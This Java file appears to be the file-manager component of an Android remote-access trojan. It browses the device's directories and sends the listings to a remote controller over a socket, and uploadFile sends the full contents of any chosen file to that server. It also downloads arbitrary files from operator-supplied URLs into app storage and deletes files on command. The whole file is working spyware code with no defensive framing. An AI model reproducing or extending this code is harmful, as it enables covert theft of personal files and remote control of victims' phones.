package com.remote.app.Managers;

import android.content.Context;
import android.util.Log;

import com.remote.app.IOSocket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;


public class FileManager {


    public static JSONArray walk(String path){

        // Read all files sorted into the values-array
        JSONArray values = new JSONArray();
        File dir = new File(path);
        if (!dir.canRead()) {
            Log.d("cannot","inaccessible");
            try {
                JSONObject errorJson = new JSONObject();
                errorJson.put(base.FILES.FILE_TYPE, "error");
                errorJson.put("error", "Denied");
                IOSocket.getInstance().getIoSocket().emit("0xFI" , errorJson);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

        File[] list = dir.listFiles();
        try {
        if (list != null) {
            JSONObject parenttObj = new JSONObject();
            parenttObj.put(base.FILES.FILE_NAME, "../");
            parenttObj.put(base.FILES.FILE_isDir, true);
            parenttObj.put(base.FILES.FILE_PATH, dir.getParent());
            values.put(parenttObj);
            for (File file : list) {
                if (!file.getName().startsWith(".")) {
                    JSONObject fileObj = new JSONObject();
                    fileObj.put(base.FILES.FILE_NAME, file.getName());
                    fileObj.put(base.FILES.FILE_isDir, file.isDirectory());
                    fileObj.put(base.FILES.FILE_PATH, file.getAbsolutePath());
                    values.put(fileObj);
                }
            }
        }
        } catch (JSONException e) {
            e.printStackTrace();
        }


        return values;
    }
    //скачивает файл с устройства на сервер
    public static void uploadFile(String path){
        if (path == null)
            return;

        File file = new File(path);

        if (file.exists()){

            int size = (int) file.length();
            byte[] data = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                JSONObject object = new JSONObject();
                object.put(base.FILES.FILE_TYPE,"download");
                object.put(base.FILES.FILE_NAME,file.getName());
                object.put(base.FILES.FILE_BUFFER , data);
                IOSocket.getInstance().getIoSocket().emit("0xFI" , object);
                buf.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }

        }
    }

    //скачивает файл с пользовательской ссылки
    public static boolean downloadfileV1(String fileURL, Context context) { // returns true if succeeds
        try{
            boolean res=true;
            URL url = new URL(fileURL);
            HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
            int responseCode = httpConn.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {
                String fileName = "";
                String disposition = httpConn.getHeaderField("Content-Disposition");

                if (disposition != null) {
                    int index = disposition.indexOf("filename=");
                    if (index > 0) {
                        fileName = disposition.substring(index + 10,
                                disposition.length() - 1);
                    }
                } else {
                    fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1,
                            fileURL.length());
                }

                InputStream inputStream = httpConn.getInputStream();
                String saveFilePath = context.getFilesDir().getPath() + File.separator + fileName;


                FileOutputStream outputStream = new FileOutputStream(saveFilePath);

                int bytesRead = -1;
                byte[] buffer = new byte[4096];
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }

                outputStream.close();
                inputStream.close();

            } else {
                res=false;
            }
            httpConn.disconnect();
            return res;
        } catch (Exception e){
            return false;
        }
    }

    public static void DelFile(String path){
        try{
            new File(path).delete();
        }
        catch (Exception e){}

    }

}
